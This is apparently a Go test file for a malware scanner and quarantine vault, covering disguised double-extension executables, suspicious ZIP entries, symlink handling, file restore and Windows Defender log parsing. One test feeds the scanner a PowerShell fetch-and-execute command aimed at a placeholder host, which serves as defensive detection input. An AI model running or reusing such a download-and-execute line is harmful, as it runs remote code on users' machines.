package main

import (
	"archive/zip"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeTest(t *testing.T, path, data string) os.FileInfo {
	t.Helper()
	if err := os.WriteFile(path, []byte(data), 0600); err != nil {
		t.Fatal(err)
	}
	st, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	return st
}
func TestDoubleExtension(t *testing.T) {
	p := filepath.Join(t.TempDir(), "invoice.pdf.exe")
	st := writeTest(t, p, "ordinary test file")
	f := inspectFile(p, st)
	if f == nil || f.Score < 70 {
		t.Fatalf("disguised executable not flagged: %#v", f)
	}
}
func TestPowerShellDownloadAndExecute(t *testing.T) {
	p := filepath.Join(t.TempDir(), "sample.ps1")
	st := writeTest(t, p, `IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')`)
	f := inspectFile(p, st)
	if f == nil || f.Score < 70 {
		t.Fatalf("download and execute not flagged: %#v", f)
	}
}
func TestOrdinaryProgramNotFlagged(t *testing.T) {
	p := filepath.Join(t.TempDir(), "normal.exe")
	st := writeTest(t, p, "plain test")
	if f := inspectFile(p, st); f != nil {
		t.Fatalf("unexpected false positive: %+v", f)
	}
}
func TestZIPEntry(t *testing.T) {
	p := filepath.Join(t.TempDir(), "contents.zip")
	fp, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(fp)
	w, err := zw.Create("README.txt.exe")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = w.Write([]byte("test"))
	_ = zw.Close()
	_ = fp.Close()
	st, _ := os.Stat(p)
	f := inspectFile(p, st)
	if f == nil || f.Score < 60 {
		t.Fatalf("zip not flagged: %#v", f)
	}
}
func TestWalkNoLinks(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "safe.txt")
	writeTest(t, p, "safe")
	_ = os.Symlink(dir, filepath.Join(dir, "cycle"))
	count := 0
	_, err := walkNoLinks(context.Background(), dir, func(s string) { count++ })
	if err != nil || count != 1 {
		t.Fatalf("count %d err %v", count, err)
	}
}
func TestVaultRoundTrip(t *testing.T) {
	dir := t.TempDir()
	v := &Vault{path: filepath.Join(dir, "vault")}
	if err := os.Mkdir(v.path, 0700); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, "invoice.pdf.exe")
	st := writeTest(t, p, "example data")
	f := inspectFile(p, st)
	it, err := v.quarantine(*f)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(p); !os.IsNotExist(err) {
		t.Fatalf("original was not moved %v", err)
	}
	items, err := v.list()
	if err != nil || len(items) != 1 {
		t.Fatalf("vault listing %v %+v", err, items)
	}
	if err := v.restore(it.ID); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(p)
	if err != nil || string(b) != "example data" {
		t.Fatalf("restoration failed %v: %q", err, b)
	}
	items, err = v.list()
	if err != nil || len(items) != 0 {
		t.Fatalf("vault not cleared %v %d", err, len(items))
	}
}
func TestVaultPreventsChangedFiles(t *testing.T) {
	dir := t.TempDir()
	v := &Vault{path: filepath.Join(dir, "vault")}
	_ = os.Mkdir(v.path, 0700)
	p := filepath.Join(dir, "test.txt.exe")
	st := writeTest(t, p, "contents")
	f := Finding{Path: p, Size: st.Size(), Modified: st.ModTime()}
	_ = os.WriteFile(p, []byte("changed contents"), 0600)
	if _, err := v.quarantine(f); err == nil {
		t.Fatal("expected changed-file rejection")
	}
}
func TestDefenderParser(t *testing.T) {
	data := `Scan starting...
Scan finished.
Scanning C:\temp\test.com found 1 threats.
<=================LIST OF DETECTED THREATS=================>
Threat                  : Virus:DOS/EICAR_Test_File
Resources               : 1 total
    file                : C:\temp\test.com
`
	res := parseDefender(data)
	if len(res) != 1 || !strings.Contains(res[0].Reasons[0], "EICAR") {
		t.Fatalf("unexpected %+v", res)
	}
}
